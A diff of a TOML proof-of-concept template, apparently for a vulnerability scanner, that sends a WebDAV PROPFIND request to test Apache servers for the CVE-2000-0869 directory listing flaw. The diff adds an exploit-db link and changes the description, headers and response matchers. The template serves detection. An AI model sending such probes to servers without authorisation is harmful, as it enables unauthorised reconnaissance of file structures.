@@ -1,15 +1,14 @@
+[exploit]
+exp_urls = []
+poc_urls = ["https://www.exploit-db.com/exploits/20210"]
+
 [info]
-author = "AVE"
-description = "向 Apache 1.3.12 服务器根目录发送 PROPFIND HTTP 请求，检测 WebDAV 目录列举漏洞。若服务器返回 207 Multi-Status 状态码且响应体包含 DAV XML 命名空间，说明 WebDAV 已启用且存在目录遍历风险。攻击者可能利用此漏洞获取服务器文件结构信息。"
+author = "ave"
+description = "向目标 Apache 服务器发送 PROPFIND 请求，验证 WebDAV 模块是否允许未授权目录列举"
 id = "POC-AVE-2000-0639"
-name = "Apache HTTP Server 1.3.12 WebDAV Directory Listing PoC"
+name = "Apache WebDAV 目录列举漏洞 PoC"
 severity = "medium"
-tags = [
-    "cve-2000-0869",
-    "webdav",
-    "apache",
-    "directory-listing",
-]
+tags = ["ave-2000-0639"]
 vuln_id = [
     "CVE-2000-0869",
     "AVE-2000-0639",
@@ -25,18 +24,17 @@ protocol = "http"
 
 [poc.requests.body]
 content = """
-<?xml version="1.0"?>
+<?xml version="1.0" encoding="utf-8"?>
 <D:propfind xmlns:D="DAV:">
-<D:prop>
-<D:displayname/>
-<D:resourcetype/>
-</D:prop>
+  <D:prop>
+    <D:resourcetype/>
+    <D:displayname/>
+  </D:prop>
 </D:propfind>"""
 type = "raw"
 
 [poc.requests.headers]
 Content-Type = "application/xml"
-Depth = "1"
 User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
@@ -48,7 +46,4 @@ type = "status"
 expect = true
 part = "body"
 type = "word"
-words = [
-    "D:multistatus",
-    'xmlns:D="DAV:"',
-]
+words = ["<D:response>"]
